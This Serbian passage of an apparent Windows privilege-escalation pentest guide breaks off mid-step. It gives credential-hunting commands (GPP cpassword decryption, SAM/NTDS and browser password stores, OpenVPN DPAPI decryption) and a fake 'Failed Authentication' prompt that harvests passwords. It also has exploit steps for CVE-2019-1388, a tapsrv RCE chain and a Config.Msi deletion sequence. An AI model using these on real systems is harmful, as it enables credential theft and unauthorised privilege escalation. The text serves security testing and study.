### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne nedostatke. Kao prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svim korisnicima domena. Kao drugo, lozinke u tim GPP-ovima, šifrovane pomoću AES256 uz javno dokumentovan podrazumevani ključ, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija koja traži lokalno keširane GPP datoteke sa nepraznim poljem "cpassword". Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži podatke o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje vrednosti cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa akreditivima:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP backup arhiva postavljena direktno u webroot koji se poslužuje može da otkrije prethodne konfiguracione fajlove i kredencijale koji se mogu ponovo koristiti. Proverite fizičku putanju podešenu za sajt i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je moguća lokacija. Brz lokalni pregled može da izlista nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne potvrđuje da ona sadrži tajnu niti da pribavljeni akreditiv omogućava viši nivo privilegija.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dnevnici

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** **akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koji sadrže pristupne podatke**

Poznate datoteke koje su nekada sadržale **lozinke** u **čistom tekstu** ili Base64.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim nazivom smatrajte kandidatom za šifrovani trezor; njeno prisustvo ne znači da možete da je pročitate, otključate ili koristite sačuvane akreditive. Prilikom provere gde su takve datoteke smeštene, proverite dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiva KeePass `.kdbx` datoteka takođe je samo naznaka da postoji šifrovani trezor. Za otključavanje su potrebni prava master-password lozinka i sve konfigurisane datoteke ključeva ili faktori naloga. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u zapisu, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na ciljnoj NTLM usluzi pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Zapis u trezoru sam po sebi ne daje administratorska ili SYSTEM prava; moraju biti ispunjeni i uslovi za pristup udaljenoj usluzi, prava naloga i svaki zaseban korak izvršavanja usluge. Inventar treba da navede putanju trezora i da li je čitljiv, a ne da ispisuje bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Kredencijali u RecycleBin-u

Proverite dostupne stavke u Recycle Bin-u za obrisane rezervne kopije i arhive konfiguracija, kao i fajlove čiji nazivi izričito pominju kredencijale. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara nekoliko meseci i imati sasvim običan naziv. Windows čuva originalnu putanju i vreme brisanja u `$I` zapisu, a obrisani fajl kao njegov upareni `$R` unos; pregledajte metapodatke i proverite da li trenutni identitet ima pristup za čitanje pre otvaranja arhive. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za fajlove, pa prazan prikaz ne dokazuje da ne postoji rezervna kopija koja se može oporaviti. Naziv arhive tretirajte kao kandidat za pregled, a ne kao dokaz da sadrži ispravnu tajnu.

Dostupan obrisani `.pfx` može biti i trag za **code-signing**. Ako sadrži dostupan privatni ključ, taj ključ može da potpiše izmenjenu PowerShell skriptu; [PowerShell zahteva sertifikat za code-signing sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u procenjuju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni baš tu skriptu, da važeće pravilo prihvata nastali potpis za tu skriptu i ciljni nalog, kao i da zakazani zadatak ili drugi potrošač sa višim privilegijama zaista pokreće skriptu. Sam naziv `.pfx` fajla, predmet sertifikata ili mogućnost pisanja u skriptu ne dokazuju da je ovaj lanac uspostavljen. Pregledajte metapodatke, ACL-ove, pravila i zakazanu komandu pre otvaranja materijala privatnog ključa ili pokretanja zadatka.

Pregledajte i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene fajlove u potrazi za tragovima o kredencijalima. BitLocker izvoz ključa za oporavak može biti sačuvan kao HTML ili TXT, ponekad unutar imenovane rezervne arhive. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za oporavak domenских kredencijala van mreže potreban je i odgovarajući `SYSTEM` hive, kao što je opisano u [radnom toku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sam naziv fajla i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Ostali mogući ključevi registra sa kredencijalima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izvucite OpenSSH ključeve iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Proverite i istoriju, obeleživače i omiljene stranice u pregledačima — možda su tamo sačuvane neke **lozinke**.

Za uobičajeni profil **Default** pregledača Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok je `Local State` u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da promene lokaciju. Samo postojanje datoteke ukazuje na moguću lokaciju akreditiva: proverite da li su datoteke čitljive, da li imate DPAPI kontekst odgovarajućeg korisnika ili drugi ovlašćeni materijal ključa i da li sačuvana prijava pripada nalogu sa višim privilegijama. Enumeracija samo putanja ne mora da otvara bazu podataka niti da prikazuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu povezane datoteke ključa i šifrovanih prijava. Njihovo postojanje samo je naznaka: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li Primary Password štiti ključ pre nego što zaključite da se akreditivi mogu koristiti. Ako oporavljeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i prava grupe za [čitanje ili dešifrovanje LAPS lozinke](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne potvrđuju put do administratorskih privilegija.

Alati za izvlačenje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se pomoću ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih ID-ovima interfejsa (IID).

COM klase i interfejsi definisani su u registru, pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, tim redom. Ovaj registar nastaje objedinjavanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podređeni ključ registra **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, čija vrednost može biti **Apartment** (jedna nit), **Free** (više niti), **Both** (jedna ili više niti) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podređeni ključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete neku od DLL datoteka** koje će biti izvršene, mogli biste da **eskalirate privilegije** ako tu DLL datoteku izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Potražite datoteku sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar da biste pronašli nazive ključeva i lozinke**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alatke koje traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski izvrši svaki metasploit POST modul koji traži akreditive** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alatka [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alatki koje čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da on nasledi sve otvorene handles glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle do privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovu objavu za detaljnije objašnjenje kako da testirate i zloupotrebite dodatne otvorene handles procesa i thread-ova nasleđene sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo liči na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **client** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **client-a**, pod uslovom da ima neophodna prava **SeImpersonate**. Ako pronađete **privilegovani proces** koji komunicira preko pipe-a koji možete da oponašate, možete **dobiti veće privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje ovakvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc vektora** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani client može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **4-byte write** u bilo koju postojeću datoteku u koju može da piše `NETWORK SERVICE`, a zatim dobije Telephony admin prava i učita proizvoljan DLL kao servis. Celokupan tok:

- Pozovite `ClientAttach` sa vrednošću `pszDomainUser` postavljenom na postojeću putanju u koju je moguće pisati → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhrono upisivanje događaja.
- Svaki događaj upisuje napadačevu vrednost `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaj pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim ga odregistrujte/isključite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom DLL putanjom da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute preko Markdown renderera

Klikabilne Markdown veze prosleđene funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Praćenje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju kredencijale u komandnoj liniji**. Skripta ispod beleži komandne linije procesa svake dve sekunde i poredi trenutno stanje sa prethodnim, ispisujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz neprivilegovanog korisničkog naloga.

To omogućava istovremenu eskalaciju privilegija i zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nema potrebe da bilo šta instalirate, a binarnu datoteku koja se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su sledeći:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Ubacivanje Junction-a u direktorijum za otpremanje unutar direktorijuma koji se servira

Aplikacija može da kreira predvidljiv poddirektorijum za otpremanje, upiše u njega naziv datoteke koji je dostavio pozivalac, a zatim obradi datoteku. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisivanja sa serverske strane, upis može preko junction-a završiti u direktorijumu koji se servira preko veba. Skripta smeštena tamo može da se izvrši kao identitet veb-servisa ako server izvršava taj tip datoteke. Ovo je granica za proizvoljno upisivanje specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za upisivanje ili postojeći junction sami po sebi nisu dokaz za to.

Proverite tačnu konstrukciju putanje i redosled događaja u rukovaocu otpremanjem, efektivna prava korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces koji upisuje prati reparse point-ove i da li veb-server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i veb-servera. Pasivna inventarizacija može da prikaže ACL-ove direktorijuma i metapodatke reparse point-a, ali ne može da utvrdi ponašanje rukovaoca niti buduću zamenu junction-a. Ako se izvršavanje odvija pod servisnim nalogom, proverite **stvarni token procesa** pre razmatranja zasebne putanje za iskorišćavanje privilegija tokena.

## SYSTEM EoP preko proizvoljnog brisanja/premeštanja/preimenovanja direktorijuma

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa kodom exploita [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u suštini sastoji u zloupotrebi funkcije vraćanja izmena Windows Installer-a, kako bi se tokom procesa deinstalacije legitimne datoteke zamenile zlonamernim. Za to napadač treba da kreira **zlonamerni MSI instalacioni paket** koji će se koristiti za preuzimanje kontrole nad direktorijumom `C:\Config.Msi`. Windows Installer će kasnije koristiti taj direktorijum za čuvanje datoteka za vraćanje izmena tokom deinstalacije drugih MSI paketa, pri čemu će te datoteke biti izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje Windows Installer COM-a (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM servisu `msiexec.exe` preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Obrnutim inženjeringom utvrđeni su relevantni pozivi `IMsiServer`: `MsiBeginTransactionW` na pomaku vtable-a `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i pomaci utvrđeni su obrnutim inženjeringom i mogu se razlikovati među verzijama.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo dok otvara navedenu putanju sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Ovo potvrđuje da pozivalac može da obriše direktorijum i sprečava praćenje reparse point-a, ali **ne** povezuje provereni objekat datoteke sa kasnijim čišćenjem niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu, bez obzira na argument filtera koji je dostavio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` pod `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja koju kontroliše pozivalac, a podatak `0x00000002` predstavlja oznaku fascikle. Zatim `CleanupTempPackages(NULL, FALSE)` direktno pokreće čišćenje. Njegov worker sa povišenim privilegijama nabraja vrednosti registra i prosleđuje stavke fascikli rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, uklanja atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni redosled poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-om. Registrujte napadačev `C:\Config.Msi`, uklonite ga i dozvolite da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Time se zaobilazi predviđena zaštita koju pružaju `FILE_FLAG_OPEN_REPARSE_POINT` i mitigacija koja veruje redirekciji, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle kojem je dodeljen `WRITE_DAC` pre nego što installer pooštri DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nego što se rollback nastavi.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova funkcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju koju kontroliše napadač u `TempPackages`. Instalirajte bezbednosne ispravke Windows-a iz aprila 2025. umesto da uspešan povratak metode koristite kao test zakrpe.<sup>[[41]](#references)[[42]](#references)</sup>

Sažetak tehnike:

1. **Faza 1 – Priprema za preuzimanje kontrole (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, tako da može da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** ka datoteci nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i preimenuje ih u datoteke `.rbf` (rollback rezervne kopije).
    - **Poll-ujte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
